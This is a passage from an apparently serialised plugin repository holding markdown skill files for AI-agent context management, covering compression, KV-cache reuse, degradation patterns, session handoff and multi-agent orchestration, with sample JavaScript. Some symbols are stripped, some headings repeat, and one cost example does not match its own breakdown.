Reduction | Best For |\n|:----------|:--------------|:----------|:---------|\n| **Observation Masking** | 0% | 90-98% | Tool outputs >200 tokens |\n| **Summarization** | 5-7% | 60-90% | Mixed content |\n| **Compaction** | 0% | 50-80% | Older messages |\n\n**Quick Pattern - Observation Masking:**\n```\nBefore: 500 lines of tool output (500 tokens)\nAfter:  \"See /results/search_20260101.txt\" (12 tokens)\n```\n\n## Degradation Patterns Summary\n\n| Pattern | Symptom | Mitigation |\n|:--------|:--------|:-----------|\n| **Lost-in-Middle** | Info at 40-60% position ignored | Place critical info at start/end |\n| **Context Poisoning** | Errors compound through references | Require source citations |\n| **Context Distraction** | Model ignores training knowledge | Quality over quantity |\n| **Context Confusion** | Incorrect associations | Rigorous context selection |\n| **Context Clash** | Contradictory information | Establish information hierarchy |\n\n## KV-Cache Optimization Summary\n\n**The Four Principles:**\n\n1. **Stable Prefix**: Never change system prompts across requests\n2. **Append-Only**: Never modify previous messages\n3. **Deterministic Serialization**: Same data = same tokens (sort JSON keys)\n4. **Explicit Breakpoints**: Mark cache boundaries\n\n\n\n## Session Management Summary\n\n**Directory Structure:**\n```\n.cattoolkit/\n context/\n    scratchpad.md    # Current thinking/decisions\n    todos.md         # Persistent task tracking\n    context.log      # Session history\n    checkpoints/     # State snapshots\n```\n\n**Scratchpad Hygiene Rule:**\nOnly update scratchpad for:\n- Critical decisions made\n- Errors encountered\n- Phase changes\n- Progress milestones\n\n## Attention Manipulation via TodoWrite (Proactive Tracking)\n\nThe **recitation technique** from Manus/Claude Code pushes objectives into recent attention span to prevent \"lost-in-the-middle\" issues:\n\n### The Pattern:\n1. **Create todo.md** at task start\n2. **Update continuously** - Check off completed items, add new ones\n3. **Recite objectives** - Rewrite todo to push global plan into model's recent attention\n\n### Why It Works:\n- **Constant todo rewriting recites objectives into context end**\n- Avoids \"lost-in-the-middle\" issues without architectural changes\n\n### Implementation:\n```markdown\n# Before task\n- [ ] Research codebase structure\n- [ ] Identify patterns\n- [ ] Plan implementation\n\n# After research\n- [x] Research codebase structure\n- [ ] Identify patterns  Still visible in recent attention\n- [ ] Plan implementation\n```\n\n**Best Practice:** Update todos after every major tool call to maintain objective visibility.\n\n## System Reminders Integration\n\nSystem reminders combat context degradation through **recurring objective injection**:\n\n### Locations:\n1. **User messages** - System reminders in prompt\n2. **Tool results** - Runtime injections\n3. **Code execution** - Added via scripts\n\n### Usage Pattern:\n```bash\n# Add reminder at critical points\necho \"Reminder: Focus on authentication edge cases\" >> .claude/reminders.txt\n```\n\n### Effective Reminders:\n- **Objective recitation** - Reiterate main goal\n- **Constraint reinforcement** - Re-emphasize critical requirements\n- **Context anchoring** - Reference key context elements\n\n## Plan Mode Best Practices\n\nPlan mode uses **recurring prompts to remind the agent**:\n\n### Implementation:\n- Creates markdown files (PLAN.md) persisted during compaction\n- Stored in `.cattoolkit/context/`\n- Accessible via `/plan` command\n- Multiple plan prompts and tool schemas for lifecycle\n\n### When to Use:\n- Complex tasks requiring 10+ tool calls\n- Multi-phase implementations\n- When agent appears confused or drifting\n- Long-running workflows\n\n### Best Practices:\n- Create plan at task start\n- Update as understanding evolves\n- Reference plan in reminders\n- Use as context anchor during compaction\n\n## Integration Points\n\n| Skill | Integration |\n|:------|:------------|\n| **memory-systems** | Long-term memory complements context |\n| **agent-orchestration** | Each agent manages own context |\n| **planning-with-files** | Plans stored outside context |\n\n## Usage\n\nWhen invoked, this skill will:\n1. Assess current context state\n2. Identify appropriate technique\n3. Apply optimization\n4. Generate metrics report\n\n**For detailed implementation, see `references/` subdirectory.**\n",
        "plugins/sys-agents/skills/optimizing-context/references/compression.md": "# Context Compression Reference\n\nDetailed techniques for reducing token usage while preserving task-relevant information.\n\n## The Three Compression Techniques\n\n### 1. Observation Masking (0% Token Overhead)\n\nReplace full tool outputs with file references stored outside context window.\n\n**Implementation:**\n```javascript\nfunction executeWithMasking(toolCall) {\n  const fullResult = executeTool(toolCall)\n  const refPath = `/results/${toolCall.type}_${timestamp}.txt`\n  writeFile(refPath, fullResult)\n\n  return {\n    masked: true,\n    reference: refPath,\n    summary: summarize(fullResult, 50),\n    tokenCount: fullResult.length\n  }\n}\n```\n\n**When to Use:**\n- Tool outputs exceed 200 tokens\n- Information likely not needed immediately\n- Can retrieve on-demand if needed\n\n### 2. Summarization (5-7% Token Overhead)\n\nUse LLM to compress context while preserving semantic meaning.\n\n**Compression Trigger Points:**\n\n| Context Utilization | Method | Expected Reduction |\n|---------------------|--------|-------------------|\n| 60-80% | Light summarization | 60-70% |\n| 80-95% | Aggressive compression | 80-90% |\n| >95% | Emergency compaction | 90%+ |\n\n**Structured Summary Template:**\n```markdown\n# Context Compression Summary\n\n## Task Context\n- Current task: [Brief description]\n- Priority: [High/Medium/Low]\n\n## Files Modified\n- [path/to/file]: [Brief change description]\n\n## Key Decisions\n1. [Decision 1] - Reason: [Why]\n\n## Next Steps\n- [ ] Action 1\n\n## Masked References\n- Full output stored at: /results/[timestamp].txt\n```\n\n### 3. Compaction (Dynamic Token Management)\n\nRemove stale information while preserving recent context at full fidelity.\n\n**Multi-tier Strategy:**\n\n| Age Tier | Compression | Token Budget |\n|----------|------------|--------------|\n| Recent (last 10) | 0% | 5,000 tokens |\n| Medium (10-40) | 50% | 3,000 tokens |\n| Old (40-100) | 80% | 2,000 tokens |\n\n## Compression Decision Flow\n\n```\nContext Check  Utilization %\n < 60%: Keep as-is\n 60-80%: Light Summarization (60-70% reduction)\n 80-95%: Aggressive Compression (80-90% reduction)\n > 95%: Emergency Compaction (90%+ reduction)\n```\n\n## Quality Metrics\n\n| Metric | Target |\n|--------|--------|\n| Compression Ratio | 60-90% reduction |\n| Information Preservation | >95% of critical info |\n| Retrieval Accuracy | >90% for needed details |\n| Performance Impact | <5% task slowdown |\n\n## Cost Impact Example\n\n| Metric | Before | After | Savings |\n|--------|--------|-------|---------|\n| Tokens per task | 45,000 | 12,000 | 73% |\n| Cost per task | $0.45 | $0.12 | 73% |\n| Latency | 8.2s | 6.1s | 26% |\n",
        "plugins/sys-agents/skills/optimizing-context/references/degradation.md": "# Context Degradation Detection Reference\n\nIdentifying and preventing context-related failures in AI agent systems.\n\n## The Five Degradation Patterns\n\n### 1. Lost-in-Middle (U-Shaped Attention)\n\n**Definition:** Information at positions 40-60% of context window has poorest retrieval.\n\n**Characteristics:**\n- U-shaped attention curve\n- Independent of context window size\n- Affects both instructions and tool outputs\n\n**Detection:**\n```javascript\nconst positions = [0.1, 0.3, 0.5, 0.7, 0.9]\n// Insert facts at each position\n// Query after agent operations\n// Plot retrieval accuracy by position\n// If middle (0.5) shows >15% lower accuracy  Lost-in-Middle\n```\n\n**Mitigation:**\n- Place critical info at beginning/end\n- Apply compression when >60% full\n- Use observation masking for mid-context\n\n### 2. Context Poisoning (Hallucination Cascade)\n\n**Definition:** Initial errors compound through subsequent references.\n\n**Characteristics:**\n- Small error  referenced as fact  compounded\n- Agent \"remembers\" incorrect outputs\n- Dangerous in multi-turn reasoning\n\n**Mitigation:**\n- Require source citations for factual claims\n- Validation checkpoints before acting on information\n- External verification for critical information\n\n### 3. Context Distraction (Overwhelm)\n\n**Definition:** Large context overwhelms model's training knowledge.\n\n**Characteristics:**\n- Over-relies on external context\n- Ignores domain expertise from training\n- Decreased performance on common-sense tasks\n\n**Detection:**\n```javascript\nconst withContext = runTask(complexContext)\nconst withoutContext = runTask(minimalContext)\n// If withContext significantly worse  distraction\n```\n\n**Mitigation:**\n- Quality over quantity in context selection\n- Use high precision retrieval\n- Balance context with internal knowledge\n\n### 4. Context Confusion (Irrelevant Information)\n\n**Definition:** Irrelevant information leads to incorrect associations.\n\n**Characteristics:**\n- Draws connections between unrelated concepts\n- Increased error rate in fine distinctions\n- Problematic in technical/legal domains\n\n**Mitigation:**\n- Rigorous context selection (precision > recall)\n- Clear information boundaries in prompts\n- Use sub-agents with specialized contexts\n\n### 5. Context Clash (Contradictory Information)\n\n**Definition:** Contradictory information creates reasoning conflicts.\n\n**Characteristics:**\n- Unable to resolve contradictions\n- Task paralysis or random choice\n- Dangerous in decision-making tasks\n\n**Mitigation:**\n- Detect and flag contradictions before agent sees them\n- Establish information hierarchy (recent vs authoritative)\n- Use contradiction-aware prompts\n\n## Continuous Monitoring\n\n| Metric | Threshold | Action |\n|--------|-----------|--------|\n| Lost-in-Middle Rate | >15% middle degradation | Trigger compression |\n| Poisoning Incidents | >2 contradictions/task | Increase validation |\n| Distraction Score | >10% performance drop | Filter context |\n| Confusion Rate | >5% error increase | Tighten selection |\n| Clash Events | Any unresolved conflict | Escalate to human |\n\n## Prevention Strategies\n\n### Progressive Disclosure Pattern\n- Keep skill files 500 lines\n- Move detailed theory to `references/`\n- Context injection for heavy theory on-demand\n\n### Four-Bucket Approach\n1. **Write**: Save to files outside context\n2. **Select**: Pull only relevant context\n3. **Compress**: Reduce while preserving info\n4. **Isolate**: Separate contexts across agents\n",
        "plugins/sys-agents/skills/optimizing-context/references/kv-cache.md": "# KV-Cache Optimization Reference\n\nMaximizing KV-cache reuse for 10 cost reduction in AI agent systems.\n\n## The KV-Cache Problem\n\n**Cost Impact:**\n```\nClaude Sonnet:\n- Cached: $0.30 per 1M tokens\n- Uncached: $3.00 per 1M tokens\n- Potential savings: 90%\n\nAverage agent trajectory: 100 input : 1 output\nIf 80% cached: $0.12  $0.012 per task\n```\n\n**Anti-patterns that break KV-cache:**\n1. Unstable prefixes (changing system prompts)\n2. In-place edits (modifying previous messages)\n3. Non-deterministic serialization (different JSON order)\n4. Implicit boundaries (no cache segment markers)\n\n## The Four Optimization Principles\n\n### 1. Stable Prefix (10 Impact)\n\nKeep system prompts unchanged across requests.\n\n```javascript\n// BAD\nconst badPrompt = {\n  system: `You are AI. Date: ${new Date()}`  // Changes every request!\n}\n\n// GOOD\nconst goodPrompt = {\n  system: `You are AI. [DATE_PLACEHOLDER]`,\n  runtimeVars: { date: new Date() }  // Injected separately\n}\n```\n\n**Prefix Stability Checklist:**\n\n| Element | Rule | Cache Impact |\n|---------|------|--------------|\n| System prompt | Never change structure | High |\n| Tool definitions | Keep order stable | High |\n| Base instructions | Fixed across sessions | High |\n| Current date | Inject separately | Medium |\n\n### 2. Append-Only Context (Critical)\n\nNever modify previous messages. Always append.\n\n```javascript\n// BAD\nconversation[0] = updateSystemPrompt(newPrompt)  // Invalidates cache!\n\n// GOOD\nconversation.push({ role: 'user', content: newContext })\n```\n\n### 3. Deterministic Serialization (Essential)\n\nIdentical data must serialize to identical strings.\n\n```javascript\n// BAD - Non-deterministic\nJSON.stringify({ b: 2, a: 1 })  // Order varies\n\n// GOOD - Deterministic\nJSON.stringify(obj, Object.keys(obj).sort())\n```\n\n**Rules:**\n- Arrays: Always sorted\n- Objects: Sorted keys\n- Dates: ISO format (`2024-01-15T10:30:00Z`)\n\n### 4. Explicit Breakpoints (Control)\n\nMark cache boundaries for granular control.\n\n```javascript\ncache.setBreakpoint('system', 5000)     // System + tools\ncache.setBreakpoint('session', 15000)   // Session context\ncache.setBreakpoint('taskStart', 25000) // Task begins\n```\n\n| Breakpoint | Content | Cache Lifetime |\n|------------|---------|----------------|\n| System | System prompt + tools | Entire session |\n| Session | User profile + history | Current task |\n| Task | Task definition | Current subtask |\n\n## Target Metrics\n\n| Metric | Target |\n|--------|--------|\n| Cache Hit Rate | >80% |\n| Cost Savings | >70% |\n| Prefix Stability | 95% |\n| Serialization Stability | 100% |\n\n## Cost Impact Example\n\n**Before Optimization:**\n```\nCache hit rate: 20%\nCost per task: $0.135\n```\n\n**After Optimization:**\n```\nCache hit rate: 85%\nCost per task: $0.040\nSavings: 70%\n```\n\n**Breakdown:**\n- System prompt (cached): 5K  $0.30 = $0.0015\n- Tool definitions (cached): 10K  $0.30 = $0.003\n- Session context (cached): 15K  $0.30 = $0.0045\n- Dynamic context (uncached): 15K  $3.00 = $0.045\n- **Total**: $0.054 (was $0.135)\n",
        "plugins/sys-agents/skills/optimizing-context/references/session-management.md": "# Session Management Reference\n\nPersistent session state management via the Passive Hook System.\n\n## Directory Structure\n\n```\n.cattoolkit/\n context/\n    scratchpad.md     # Current thinking and decisions\n    todos.md          # Persistent task tracking\n    context.log       # Session context history\n    handoff.md        # Session handoff summary\n    checkpoints/      # Critical state snapshots\n planning/             # Managed by planning skills\n```\n\n## Scratchpad Hygiene\n\n**CRITICAL:** Only update scratchpad for:\n- Critical decisions made\n- Errors encountered\n- Phase changes\n- Progress milestones\n\n**NEVER update for:** Trivial file reads (prevents context churn)\n\n## Hybrid Hook Architecture\n\n**Command Hooks (Deterministic, Fast):**\n\n| Hook | Trigger | Action |\n|:-----|:--------|:-------|\n| SessionStart | Session begins | Auto-load plan + scratchpad |\n| PostToolUse | After Edit/Write/Bash | Auto-log state changes |\n| PreCompact | Context near overflow | Create checkpoint |\n\n**Deterministic Script Hooks:**\n\n| Hook | Trigger | Action |\n|:-----|:--------|:-------|\n| Stop | Session stopping | Evaluate safe exit |\n| SubagentStop | Agent stops | Verify completion |\n\n## Context Window Thresholds\n\n| Level | Action |\n|-------|--------|\n| 60% Warning | Begin context tracking |\n| 70% Critical | Create checkpoint + handoff |\n| 80% Overflow | Force session rotation |\n\n## Progressive Disclosure Levels\n\n| Level | Tokens | Content |\n|-------|--------|---------|\n| 1 | 500 | Immediate: current task, active files, next action |\n| 2 | 2,000 | Task: requirements, approach, related files |\n| 3 | 3,000 | Project: overview, decisions, conventions |\n| 4 | On-demand | Reference: detailed docs, examples |\n\n## Context Health Metrics\n\n| Metric | Description |\n|--------|-------------|\n| Token Efficiency | Actionable context percentage |\n| Information Density | Relevant info per token |\n| Context Relevance | Context used in responses |\n| Update Frequency | How often context refreshed |\n\n## Handoff Protocol\n\nWhen creating session handoff:\n\n1. **Completed Work**: List finished tasks\n2. **Current State**: Files modified, pending changes\n3. **Next Steps**: Clear prioritized actions\n4. **Critical Context**: Key decisions, blockers\n5. **File Summary**: Important file locations\n\n## Templates\n\n**Scratchpad Template:**\n```markdown\n# Scratchpad\n\n## Current Session\n- Task: [description]\n- Phase: [planning/implementing/testing]\n\n## Decisions Made\n- [Decision]: [Rationale]\n\n## Open Questions\n- [ ] [Question]\n\n## Recent Progress\n- [Progress item]\n```\n\n**Handoff Template:**\n```markdown\n# Session Handoff\n\n## Completed\n- [Task completed]\n\n## Current State\n- Working on: [task]\n- Files modified: [files]\n\n## Next Steps\n1. [Priority action]\n\n## Context\n- Key decision: [decision]\n- Blocker: [if any]\n```\n",
        "plugins/sys-agents/skills/orchestrating-agents/SKILL.md": "---\nname: orchestrating-agents\ndescription: \"Implements Orchestrator, Swarm, and Hierarchical patterns for preventing context saturation. Use when designing multi-agent systems for context isolation and parallel execution.\"\nuser-invocable: true\nallowed-tools: [Read, Write, Bash, Grep, Glob]\n---\n\n# Multi-Agent Orchestration for Context Isolation\n\nImplements Orchestrator, Swarm, and Hierarchical patterns.\n\n\n\n## The Three Orchestration Patterns\n\n### 1. Orchestrator Pattern (Task Delegation)\n\n### 1. Orchestrator Pattern (Task Delegation)\n\n**When to Use:**\n- Single complex task requiring different expertise areas\n- Need to prevent main agent context saturation\n- Tasks have clear sub-components that can be parallelized\n- Want centralized planning with distributed execution\n\n\n\n### 2. Swarm Pattern (Parallel Execution)\n\n### 2. Swarm Pattern (Parallel Execution)\n\n**When to Use:**\n- Multiple independent tasks of same type\n- Need for parallel speedup\n- Different perspectives on same problem\n- Large-scale data processing\n\n\n\n### 3. Hierarchical Pattern (Supervision)\n\n### 3. Hierarchical Pattern (Supervision)\n\n**When to Use:**\n- Large, complex tasks with hierarchy\n- Need for quality control\n- Multi-level task decomposition\n- Quality gates required\n\n\n\n## Pattern Selection Guide\n\n### Decision Matrix\n\n| Use Case | Orchestrator | Swarm | Hierarchical |\n|----------|--------------|-------|--------------|\n| **Task Decomposition** | Best | Possible | Good |\n| **Parallel Execution** | Limited | Best | Possible |\n| **Quality Control** | Limited | No | Best |\n| **Scalability** | Medium | High | High |\n| **Complexity** | Medium | Low | High |\n\n### Selection Criteria\n\n**Choose Orchestrator when:** Clear task decomposition available, need centralized coordination, different expertise areas required, single complex task\n\n**Choose Swarm when:** Multiple independent tasks, parallel speedup needed, different perspectives helpful, large-scale processing\n\n**Choose Hierarchical when:** Quality control critical, multi-level tasks, need supervision at each level, complex error handling required\n\n## Context Isolation Principles\n\n\n\n### The Solution: Context Isolation\n\n**Rule 1: Specialized Contexts** - Each agent has focused context, only task-relevant information, no cross-agent contamination\n\n**Rule 2: Minimal Exchange** - Pass only necessary data, use structured formats, avoid conversation history sharing\n\n**Rule 3: Results, Not Context** - Agents return results, not ongoing context, synthesize results centrally, maintain global view in orchestrator\n\n## Advanced Context Isolation Strategies\n\n\n\n### Context Degradation Patterns\n\n| Pattern | Symptom | Mitigation |\n|:--------|:--------|:-----------|\n| **Lost-in-Middle** | Info at 40-60% position ignored | Place critical info at start/end |\n| **Context Poisoning** | Errors compound through references | Require source citations |\n| **Context Distraction** | Model ignores training knowledge | Quality over quantity |\n| **Context Confusion** | Incorrect associations | Rigorous context selection |\n| **Context Clash** | Contradictory information | Establish information hierarchy |\n\n### Context Isolation Techniques\n\n#### 1. TodoWrite Attention Manipulation (Recitation)\nConstantly rewrite todos to push objectives into recent attention span:\n\n```markdown\n# Update after every major tool call\n## Phase 1: Research\n- [x] Analyze codebase structure\n- [ ] Identify patterns   Visible in recent attention\n- [ ] Plan implementation\n```\n\n**Why It Works:**\n- **Todo rewriting recites objectives into context end**\n\n#### 2. System Reminders\nCombat degradation through recurring objective injection:\n\n**Effective Patterns:**\n- **Objective recitation** - Reiterate main goal\n- **Constraint reinforcement** - Re-emphasize requirements\n- **Context anchoring** - Reference key elements\n\n#### 3. Plan Mode Coordination\nUse plan mode for complex, multi-phase tasks:\n\n**When to Use:**\n- Complex tasks requiring 10+ tool calls\n- Multi-phase implementations\n- When agent appears confused or drifting\n\n**Best Practices:**\n- Create plan at task start\n- Update as understanding evolves\n- Reference plan in reminders\n- Store in `.cattoolkit/context/plan.md`\n\n### Context Window Thresholds & Actions\n\n| Utilization | Action | Technique |\n|:------------|:-------|:----------|\n| **<60%** | Monitor | No action needed |\n| **60-80%** | Light compression | Observation masking |\n| **80-95%** | Aggressive compression | Summarization + compaction |\n| **>95%** | Emergency | Force session handoff |\n\n## Best Practices\n\n### Recommended Practices\n\n**Define Clear Interfaces** - Specify input/output formats, use structured data, document expectations\n\n**Minimize Context Sharing** - Pass only necessary data, avoid conversation history, use file-based coordination\n\n**Isolate Agent Contexts** - Each agent focused on specific task, no cross-contamination, specialized expertise\n\n**Return Results, Not Context** - Agents produce artifacts, structured outputs, central synthesis\n\n**Test Isolation** - Verify agents don't share context, check result quality, validate coordination\n\n**Use Progressive Context Loading** - Load only what's needed when needed\n\n**Apply Attention Management** - Use TodoWrite, reminders, and plan mode strategically\n\n### Practices to Avoid\n\n**Sharing Full Context** - Never pass conversation history, don't share unrelated information, maintain isolation\n\n**Over-Complicating** - Start simple, add complexity incrementally, use appropriate pattern\n\n**Ignoring Coordination** - Plan result merging, handle conflicts, manage dependencies\n\n**Violating Isolation** - Keep contexts separate, use file-based coordination, respect boundaries\n\n**Ignoring Degradation** - Monitor context utilization, apply compression early\n\n## Reference Materials\n\n**Core Patterns:**\n- **See:** [orchestrator-pattern.md](references/orchestrator-pattern.md) - Complete orchestrator implementation guide\n- **See:** [swarm-pattern.md](references/swarm-pattern.md) - Complete swarm implementation guide\n- **See:** [hierarchical-pattern.md](references/hierarchical-pattern.md) - Complete hierarchical implementation guide\n\n**Implementation:**\n- **See:** [implementation-guide.md](references/implementation-guide.md) - Step-by-step implementation\n- **See:** [context-isolation.md](references/context-isolation.md) - Context management strategies\n- **See:** [coordination.md](references/coordination.md) - Agent coordination patterns\n\n## Next Steps\n\n1. **Assess Requirements** - Task complexity, parallelism needs, quality requirements\n2. **Choose Pattern** - Use decision matrix, consider constraints, match use case\n3. **Design Architecture** - Define agent roles, plan context isolation, specify interfaces\n4. **Implement Incrementally** - Start simple, add complexity, test isolation\n5. **Monitor and Optimize** - Measure performance, check quality, optimize bottlenecks\n",
        "plugins/sys-agents/skills/orchestrating-agents/references/context-isolation.md": "# Context Isolation\n\n## The Context Problem\n\n### Why Context Isolation Matters\n\n**Context Window Limits:**\n- Claude 3.5: 200K tokens\n- Shared across entire task\n- Conversations grow over time\n- Tasks saturate context quickly\n\n**Without Isolation:**\n```\nMain Agent Context:\n  - Full conversation history\n  - All task details\n  - Irrelevant information\n  - Context overflow\n  - Quality degradation\n```\n\n**With Isolation:**\n```\nMain Agent Context:\n  - High-level overview\n  - Task summary\n  - Reference to files\n\nSpecialized Agent Contexts:\n  - Agent 1: Focused on subtask A\n  - Agent 2: Focused on subtask B\n  - Agent 3: Focused on subtask C\n  - Each has minimal, relevant context\n```\n\n## Core Principles\n\n### Principle 1: Specialized Contexts\n\nEach agent should have **focused, minimal context** relevant to its specific task.\n\n```javascript\n// Bad: Full context\nconst agent = new AnalysisAgent()\nagent.execute({\n  task: \"Analyze customer churn\",\n  context: {\n    entireConversationHistory: [...], // 100K tokens\n    allCustomerData: [...], // 50K tokens\n    previousAnalyses: [...], // 30K tokens\n    irrelevantDiscussions: [...] // 20K tokens\n  }\n})\n\n// Good: Focused context\nconst agent = new ChurnAnalysisAgent()\nagent.execute({\n  task: \"Analyze churn patterns in Q4\",\n  context: {\n    relevantData: churnData.slice(0, 1000), // 5K tokens\n    metrics: ['churn_rate', 'customer_lifetime'],\n    outputFormat: 'markdown_report'\n  }\n})\n```\n\n### Principle 2: Minimal Exchange\n\nPass **only necessary data** between agents.\n\n```javascript\n// Bad: Excessive sharing\nagent1.execute(task1, {\n  ...task1.context,\n  allSharedData: getAllData(),\n  conversationHistory: getFullHistory()\n})\n\n// Good: Minimal exchange\nagent1.execute(task1, {\n  task: task1.description,\n  relevantData: filterRelevantData(task1.context.data, task1),\n  constraints: task1.constraints\n})\n```\n\n### Principle 3: Results, Not Context\n\nAgents should return **results and artifacts**, not ongoing context.\n\n```javascript\n// Bad: Return context\nfunction execute(task) {\n  const result = processTask(task)\n  return {\n    success: true,\n    context: result, // Wrong: returning context\n    history: processHistory()\n  }\n}\n\n// Good: Return results\nfunction execute(task) {\n  const result = processTask(task)\n  return {\n    success: true,\n    output: result.output,\n    artifacts: result.artifacts,\n    metadata: result.metadata\n  }\n}\n```\n\n## Implementation Strategies\n\n### Strategy 1: Task Decomposition Context\n\nExtract only context relevant to each subtask.\n\n```javascript\nclass ContextExtractor {\n  extractForSubtask(task, subtask) {\n    return {\n      task: subtask.description,\n      data: this.filterRelevantData(task.data, subtask.relevantCriteria),\n      constraints: subtask.constraints,\n      outputFormat: subtask.outputFormat,\n      resources: subtask.resources\n    }\n  }\n\n  filterRelevantData(allData, criteria) {\n    return allData.filter(item =>\n      criteria.some(criterion => this.matchesCriterion(item, criterion))\n    )\n  }\n\n  matchesCriterion(item, criterion) {\n    // Implement filtering logic\n    if (criterion.type === 'field') {\n      return item.hasOwnProperty(criterion.field)\n    } else if (criterion.type === 'value') {\n      return item[criterion.field] === criterion.value\n    } else if (criterion.type === 'range') {\n      return item[criterion.field] >= criterion.min &&\n             item[criterion.field] <= criterion.max\n    }\n    return false\n  }\n}\n```\n\n### Strategy 2: Context Summarization\n\nSummarize large contexts into concise versions.\n\n```javascript\nclass ContextSummarizer {\n  summarize(context, maxTokens = 5000) {\n    if (this.countTokens(context) <= maxTokens) {\n      return context\n    }\n\n    return {\n      summary: this.generateSummary(context),\n      keyPoints: this.extractKeyPoints(context),\n      metadata: {\n        originalSize: this.countTokens(context),\n        summarySize: this.countTokens(this.generateSummary(context)),\n        compressionRatio: this.countTokens(context) / maxTokens\n      }\n    }\n  }\n\n  generateSummary(context) {\n    // Use LLM or heuristic to summarize\n    return summarizeWithLLM(context)\n  }\n\n  extractKeyPoints(context) {\n    // Extract important facts\n    return context.data\n      .filter(item => item.importance > 0.8)\n      .map(item => ({\n        fact: item.fact,\n        confidence: item.confidence,\n        source: item.source\n      }))\n  }\n}\n```\n\n### Strategy 3: File-Based Coordination\n\nUse files instead of passing context directly.\n\n```javascript\nclass FileBasedCoordinator {\n  async coordinate(orchestrator, task) {\n    // Decompose task\n    const subtasks = orchestrator.decompose(task)\n\n    // Write task file\n    const taskFile = await this.writeTaskFile(task)\n\n    // Execute subtasks\n    const results = await Promise.all(\n      subtasks.map(async (subtask) => {\n        const subtaskFile = await this.writeSubtaskFile(subtask, taskFile)\n\n        const result = await this.executeSubtask(subtaskFile)\n\n        await this.writeResultFile(result)\n\n        return result\n      })\n    )\n\n    // Synthesize\n    return orchestrator.synthesize(results)\n  }\n\n  async executeSubtask(subtaskFile) {\n    // Agent reads subtask file, writes result file\n    // No direct context passing\n    const agent = new SpecializedAgent()\n    return agent.execute(subtaskFile)\n  }\n}\n```\n\n## Context Isolation Patterns\n\n### Pattern 1: Narrow Context Window\n\n```javascript\nclass NarrowContextAgent {\n  constructor(maxTokens = 3000) {\n    this.maxTokens = maxTokens\n  }\n\n  execute(task, context) {\n    // Trim context to fit\n    const trimmedContext = this.trimToLimit(context)\n\n    // Process with trimmed context\n    return this.process(task, trimmedContext)\n  }\n\n  trimToLimit(context) {\n    let result = { ...context }\n    let tokenCount = this.countTokens(JSON.stringify(result))\n\n    while (tokenCount > this.maxTokens && result.data.length > 0) {\n      // Remove least important data\n      result.data = result.data.slice(1)\n      tokenCount = this.countTokens(JSON.stringify(result))\n    }\n\n    return result\n  }\n}\n```\n\n### Pattern 2: Context Partitioning\n\n```javascript\nclass PartitionedContext {\n  partition(context, numPartitions) {\n    return {\n      metadata: this.extractMetadata(context),\n      partitions: this.splitData(context.data, numPartitions),\n      references: context.references\n    }\n  }\n\n  splitData(data, numPartitions) {\n    const partitionSize = Math.ceil(data.length / numPartitions)\n    const partitions = []\n\n    for (let i = 0; i < numPartitions; i++) {\n      const start = i * partitionSize\n      const end = Math.min(start + partitionSize, data.length)\n      partitions.push(data.slice(start, end))\n    }\n\n    return partitions\n  }\n}\n```\n\n### Pattern 3: Progressive Context Building\n\n```javascript\nclass ProgressiveContextAgent {\n  async execute(task, initialContext) {\n    let context = initialContext\n\n    // Start with minimal context\n    let result = await this.processWithContext(task, context.minimal)\n\n    // If quality is low, add more context\n    if (result.quality < task.qualityThreshold) {\n      context = await this.expandContext(context)\n      result = await this.processWithContext(task, context.expanded)\n    }\n\n    return result\n  }\n\n  async expandContext(context) {\n    return {\n      ...context,\n      expanded: {\n        ...context.minimal,\n        additionalData: await this.fetchAdditionalData(context)\n      }\n    }\n  }\n}\n```\n\n## Anti-Patterns\n\n### Anti-Pattern 1: Context Leakage\n\n**Problem:** Agents access more context than needed.\n\n```javascript\n// Bad: Agent has access to full context\nclass LeakyAgent {\n  constructor(fullContext) {\n    this.context = fullContext // Can access everything\n  }\n\n  execute(task) {\n    // Agent can access irrelevant data\n    const irrelevantData = this.context.allHistoricalData\n    return this.process(task)\n  }\n}\n\n// Good: Agent gets minimal context\nclass IsolatedAgent {\n  constructor(minimalContext) {\n    this.context = minimalContext // Only what's needed\n  }\n\n  execute(task) {\n    // Only has access to relevant data\n    const relevantData = this.context.relevantData\n    return this.process(task)\n  }\n}\n```\n\n### Anti-Pattern 2: Context Accumulation\n\n**Problem:** Context grows with each interaction.\n\n```javascript\n// Bad: Accumulating context\nclass AccumulatingAgent {\n  constructor() {\n    this.context = []\n  }\n\n  async execute(task) {\n    this.context.push({\n      task: task,\n      result: await this.process(task)\n    })\n\n    return this.context\n  }\n}\n\n// Good: Stateless agents\nclass StatelessAgent {\n  execute(task) {\n    // Each execution is independent\n    return this.process(task)\n  }\n}\n```\n\n### Anti-Pattern 3: Shared Mutable State\n\n**Problem:** Agents modify shared context.\n\n```javascript\n// Bad: Shared mutable state\nconst sharedContext = {\n  data: [...],\n  history: [...]\n}\n\nclass SharedStateAgent {\n  execute(task) {\n    sharedContext.data.push(task.data) // Modifies shared state\n    sharedContext.history.push(task)\n    return this.process(sharedContext)\n  }\n}\n\n// Good: Immutable contexts\nclass ImmutableAgent {\n  execute(task, context) {\n    // Create new context, don't modify\n    const newContext = {\n      ...context,\n      data: [...context.data, task.data]\n    }\n    return this.process(newContext)\n  }\n}\n```\n\n## Context Isolation Tools\n\n### Tool 1: Context Analyzer\n\n```javascript\nclass ContextAnalyzer {\n  analyze(context) {\n    return {\n      size: this.countTokens(context),\n      complexity: this.calculateComplexity(context),\n      relevantPercentage: this.calculateRelevance(context),\n      recommendations: this.getRecommendations(context)\n    }\n  }\n\n  countTokens(context) {\n    // Count tokens in context\n    return tokenize(JSON.stringify(context)).length\n  }\n\n  calculateComplexity(context) {\n    // Measure structural complexity\n    return {\n      nestingDepth: this.getMaxNestingDepth(context),\n      numberOfFields: this.countFields(context),\n      dataTypes: this.countDataTypes(context)\n    }\n  }\n\n  getRecommendations(context) {\n    const recommendations = []\n\n    if (this.countTokens(context) > 10000) {\n      recommendations.push({\n        type: 'size',\n        message: 'Context is large. Consider summarization or filtering.',\n        action: 'summarize'\n      })\n    }\n\n    if (this.getRelevance(context) < 0.5) {\n      recommendations.push({\n        type: 'relevance',\n        message: 'Low relevance. Filter to most important data.',\n        action: 'filter'\n      })\n    }\n\n    return recommendations\n  }\n}\n```\n\n### Tool 2: Context Validator\n\n```javascript\nclass ContextValidator {\n  validate(context, requirements) {\n    const errors = []\n    const warnings = []\n\n    // Check size\n    const tokenCount = this.countTokens(context)\n    if (tokenCount > requirements.maxTokens) {\n      errors.push(`Context exceeds token limit: ${tokenCount} > ${requirements.maxTokens}`)\n    }\n\n    // Check required fields\n    for (const field of requirements.requiredFields) {\n      if (!context.hasOwnProperty(field)) {\n        errors.push(`Missing required field: ${field}`)\n      }\n    